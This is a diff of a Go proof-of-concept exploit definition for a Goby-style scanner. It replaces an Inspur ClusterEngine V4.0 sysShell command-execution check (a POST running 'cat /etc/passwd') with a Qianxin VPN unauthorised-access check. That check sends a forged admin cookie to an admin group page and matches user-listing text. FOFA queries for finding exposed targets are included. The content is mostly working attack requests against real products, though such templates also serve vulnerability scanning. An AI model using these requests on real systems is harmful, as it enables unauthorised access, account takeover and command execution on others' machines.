@@ -6,14 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞",
+  "Name": "奇安信vpn未授权管理用户遍历及任意账号密码修改",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
-  "Author": "",
-  "FofaQuery": "title=\"TSCEV4.0\" || product=\"Inspur-ClusterEngine\" || \"ClusterEngine\"",
-  "GobyQuery": "title=\"TSCEV4.0\" || product=\"Inspur-ClusterEngine\" || \"ClusterEngine\"",
+  "PostTime": "2023-06-20",
+  "Author": "清晨",
+  "FofaQuery": "product=\"奇安信-VPN\" || icon_hash=\"663709625\" || body=\"启动奇安信VPN客户端\"",
+  "GobyQuery": "product=\"奇安信-VPN\" || icon_hash=\"663709625\" || body=\"启动奇安信VPN客户端\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -29,12 +30,14 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "POST",
-        "uri": "/sysShell",
-        "follow_redirect": true,
-        "header": {},
+        "method": "GET",
+        "uri": "/admin/group/x_group.php?id=1",
+        "follow_redirect": false,
+        "header": {
+          "Cookie": "admin_id=1; gw_admin_ticket=1;"
+        },
         "data_type": "text",
-        "data": "op=doPlease&node=cu01&command=cat /etc/passwd"
+        "data": ""
       },
       "ResponseTest": {
         "type": "group",
@@ -51,7 +54,21 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "root:",
+            "value": "名字:",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "用户信息:",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "隶属于父组:",
             "bz": ""
           }
         ]
@@ -107,7 +124,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞",
+      "Name": "奇安信vpn未授权管理用户遍历及任意账号密码修改",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +133,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "tide ClusterEngineV4 sysShell rce",
+      "Name": "qianxin vpn userlist motify user password",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -131,8 +148,7 @@ func init() {
     "Service": null,
     "System": null,
     "Hardware": null
-  },
-  "PostTime": "2023-06-20"
+  }
 }`
 
 	ExpManager.AddExploit(NewExploit(
